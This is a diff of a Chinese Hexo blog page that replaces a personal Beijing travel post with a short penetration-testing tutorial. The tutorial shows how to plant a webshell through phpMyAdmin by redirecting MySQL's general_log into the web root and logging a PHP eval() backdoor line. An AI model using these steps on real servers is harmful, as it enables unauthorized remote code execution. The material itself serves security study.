@@ -4,7 +4,7 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="记录美好生活, 浮生">
+    <meta name="keywords" content="phpMyAdmin突破secure-file-priv写WebShell, 浮生">
     <meta name="description" content="侠之大者，为国为民">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>记录美好生活 | 浮生</title>
+    <title>phpMyAdmin突破secure-file-priv写WebShell | 浮生</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -309,12 +309,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">记录美好生活</h1>
+                    <h1 class="description center-align post-title">phpMyAdmin突破secure-file-priv写WebShell</h1>
                 </div>
             </div>
         </div>
@@ -451,7 +451,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-04-23
+                    2020-05-25
                 </div>
                 
 
@@ -460,7 +460,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    424
+                    259
                 </div>
                 
 
@@ -482,23 +482,31 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="考研end"><a href="#考研end" class="headerlink" title="考研end"></a>考研end</h1><p>最后一场考完，心里啥都不想了，就觉得考砸了，但还是乱七八糟的啥都没想，爱咋咋地吧！</p>
-<p><img src="images/ky.jpg"></p>
-<h1 id="北京之行"><a href="#北京之行" class="headerlink" title="北京之行"></a>北京之行</h1><p>冬至，考完就马不停蹄出去浪～到北京已经凌晨了，时隔将近二十个年头，我又来到了北京，第一次见到凌晨的北京，灯光依旧很亮，不过还是把冬至没吃的饺子给补上了嘿嘿<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f606.png?v8">😆</span></p>
-<p><strong>一早便去了天坛，看起来确实很威严</strong></p>
-<p><img src="images/tiantan.jpg"></p>
-<p>去了颐和园，颐和园是真的真的真的太大太大了，古代皇帝逛个自家花园估计也得逛饿了把，哦，确实 – 我们忘了提前买好吃的（好饿<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f611.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f611.png?v8">😑</span>），买了几个包子和热狗（好贵哈哈哈）之后做了短暂停留便离开了。</p>
-<p>ps：如果是夏天就好了，景色肯定会比现在好看得多</p>
-<p><img src="images/yiheyuan.jpg"></p>
-<p><strong>来到了故宫</strong></p>
-<p>那天，正好下雪了，虽然不大，但还是倍感荣幸。</p>
-<p>可惜没有到机会漱芳斋去看看</p>
-<p>下面，庄士敦先生曾经住过的地方</p>
-<p><img src="images/zhuangshidun.jpg"></p>
-<p>一天的溜达，来到了同锣鼓巷，不过好像也没有太多的好吃和好玩的的貌似<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/1f612.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/1f612.png?v8">😒</span>。不过是有幸与喜欢的人一起，所有的东西都变得喜欢了<span class="github-emoji" style="color: transparent;background:no-repeat url(https://github.githubassets.com/images/icons/emoji/unicode/2764.png?v8) center/contain" data-src="https://github.githubassets.com/images/icons/emoji/unicode/2764.png?v8">❤</span>。 </p>
-<p>老北京炸酱面哈哈哈，也许是我渴了，所以我觉得我更感兴趣的是那面汤哈哈哈。</p>
-<p><img src="images/eat.jpg"></p>
-<p>期待下一次游历… …</p>
+                <p>1.查看<code>secure_file_priv</code>值</p>
+<pre class="line-numbers language-bash"><code class="language-bash">show global variables like <span class="token string">'%secure_file_priv%'</span><span class="token punctuation">;</span>
+<span class="token comment" spellcheck="true"># show global variables like '%secure%';</span>
+
+<span class="token comment" spellcheck="true"># 此开关默认为NULL：即不允许导入导出</span>
+<span class="token comment" spellcheck="true"># 没有具体值时：表示不对mysqld 的导入|导出做限制</span>
+<span class="token comment" spellcheck="true"># 值为/tmp/ ：表示限制mysqld 的导入|导出只能发生在/tmp/目录下</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>2.查询操作日志存放路径</p>
+<pre class="line-numbers language-bash"><code class="language-bash">show variables like <span class="token string">'general_log%'</span><span class="token punctuation">;</span>
+
+<span class="token comment" spellcheck="true"># 操作日志默认也是关闭的</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>3.首先打开操作日志记录</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> global general_log <span class="token operator">=</span> <span class="token string">'ON'</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>4.设置操作记录日志路径(<code>前提是获取到了绝对路径</code>)</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># set global general_log_file='路径地址';</span>
+<span class="token comment" spellcheck="true"># 选择网站的目录里面</span>
+<span class="token keyword">set</span> global general_log_file<span class="token operator">=</span><span class="token string">'D:\\phpstudy\\PHPTutorial\\WWW\\xx.php'</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>5.执行sql语句，mysql会将执行的语句内容记录到我们指定的文件中，就可以getshell了</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">select</span> <span class="token string">'&lt;?php @eval(<span class="token variable">$_POST</span>[1]);?>'</span><span class="token punctuation">;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>6.访问webshell，进行后续操作</p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -542,7 +550,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://www.xpshuai.cn/life/index.html">http://www.xpshuai.cn/life/index.html</a>
+                    <a href="http://www.xpshuai.cn/posts/64672/">http://www.xpshuai.cn/posts/64672/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -748,7 +756,7 @@
         repo: 'hexo-gitalk',
         owner: 'shuai06',
         admin: "shuai06",
-        id: '2019-04-23T12-06-33',
+        id: '2020-05-25T18-02-10',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -777,26 +785,28 @@
                 <i class="far fa-dot-circle"></i>&nbsp;本篇
             </div>
             <div class="card">
-                <a href="/life/index.html">
+                <a href="/posts/64672/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="记录美好生活">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="phpMyAdmin突破secure-file-priv写WebShell">
                         
-                        <span class="card-title">记录美好生活</span>
+                        <span class="card-title">phpMyAdmin突破secure-file-priv写WebShell</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            考研end最后一场考完，心里啥都不想了，就觉得考砸了，但还是乱七八糟的啥都没想，爱咋咋地吧！
+                            1.查看secure_file_priv值
+show global variables like '%secure_file_priv%';
+# show global variables like '%secure%';
 
-北京之行冬至，考完就马不停蹄出去浪～到北京已经凌晨了，时隔将近二十个年头，我又来到了北京，第一次见到凌晨的北京，灯光依旧很亮，不过还是把冬至没吃
+# 此开关默认
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-04-23
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-25
                             </span>
                         <span class="publish-author">
                             
@@ -814,39 +824,52 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/life/index.html">
+                <a href="/posts/58846/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/0.jpg" class="responsive-img" alt="记录美好生活">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="绕过CDN寻找真实IP">
                         
-                        <span class="card-title">记录美好生活</span>
+                        <span class="card-title">绕过CDN寻找真实IP</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            考研end最后一场考完，心里啥都不想了，就觉得考砸了，但还是乱七八糟的啥都没想，爱咋咋地吧！
-
-北京之行冬至，考完就马不停蹄出去浪～到北京已经凌晨了，时隔将近二十个年头，我又来到了北京，第一次见到凌晨的北京，灯光依旧很亮，不过还是把冬至没吃
+                            一些绕过CDN寻找真实IP地址的方法
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2019-04-23
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-25
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-user fa-fw"></i>
-                            浮生
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/渗透测试/" class="post-category">
+                                    渗透测试
+                                </a>
+                            
                             
                         </span>
                     </div>
                 </div>
-
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/渗透测试/">
+                        <span class="chip bg-color">渗透测试</span>
+                    </a>
+                    
+                    <a href="/tags/CDN/">
+                        <span class="chip bg-color">CDN</span>
+                    </a>
+                    
+                </div>
                 
             </div>
         </div>
